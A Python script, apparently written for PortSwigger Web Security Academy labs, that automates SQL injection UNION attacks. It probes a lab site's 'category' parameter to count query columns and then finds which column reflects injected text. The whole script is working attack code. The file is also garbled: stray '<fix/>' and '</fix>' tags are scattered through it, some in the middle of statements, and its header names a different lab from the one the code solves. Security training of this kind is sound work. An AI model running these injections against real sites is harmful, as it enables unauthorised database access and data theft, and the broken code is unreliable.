#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
import re

<fix/># Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables</fix>

# API Parameters
<fix/>url = 'https://abcd.web-security-academy.net/'
url = f'{url}page'</fix>
params = {'category': 'Lifestyle'}
<fix/>null = ["'UNION SELECT", 'NULL', '--']</fix>
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
<fix/>response = api_session.get(url, params=params)</fix>

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


<fix/>def sqli_union_lab_1(null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # Perform a new requests with sqli parameters
    <fix/>lab1 = api_session.get(url, params=sqli)
</fix>
    while not lab1.ok:
        # Remove '--' then add ', NULL --' until lab1.ok is True
        null.remove('--')</fix>
        null.extend([',', 'NULL', '--'])

        # Perform a new request with the updated list
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab1 = api_session.get(url, params=sqli)

    print(f"There are {null.count('NULL')} columns")

    # Return null since it now has the amount of NULL's required to exploit the application
    return null


<fix/>def sqli_union_lab_2(lab2, null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value
    provided.
    :param lab2: Global response variable
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # Parse the HTML output using Beautiful Soup to grab the secret value
    html = BeautifulSoup(lab2.text, 'html.parser')
    secret_string = html.find('p', {'id': 'hint'}).contents[0]
    secret_value = re.search("['].*[']", secret_string)

    # Perform a new request with sqli parameters
    lab2 = api_session.get(url, params=sqli)
    # Initialize column variable for accurate column count
    column = 1
    # Retrieve the location of the first 'NULL'</fix>
    step = null.index('NULL')

    while not lab2.ok:
        # Replace each NULL with the secret_value until lab2.ok is True.
        index = null.index('NULL', step)
        <fix/>null[index] = secret_value[0]

        # Perform a new request with the updated parameters</fix>
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        <fix/>lab2 = api_session.get(url, params=sqli)

        if not lab2.ok:
            # Replace the secret_value with NULL if lab2.ok is still False
            null[index] = "NULL"
            # Increase step by 1 to find the next NULL
            step = (index + 1)
            # Increase column by 1 for accurate column count
            column += 1</fix>
    print(f'Column {column} contains inserted text')

    # Return the index where the secret value appeared within the query results
    return index

    <fix/>### ALTERNATIVE TO WHILE LOOP ###
    # # Find all indexes where the value is NULL
    # only_null = [index for index, value in enumerate(null) if value == 'NULL']
    #
    # for index in only_null:
    #     while not lab2.ok:
    #         null[index] = secret_value[0]
    #         sqli['category'] = f"Lifestyle{' '.join(null)}"
    #         lab2 = api_session.get(url, params=sqli)
    #
    #         if not lab2.ok:
    #             null[index] = "NULL"
    #             column += 1
    #         break
    # else:
    #     print(f'Column {column} contains inserted text')
    #
    # # Return the index where the secret value appeared within the query results
    # return null.index(secret_value[0])</fix>


if __name__ == '__main__':
    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())
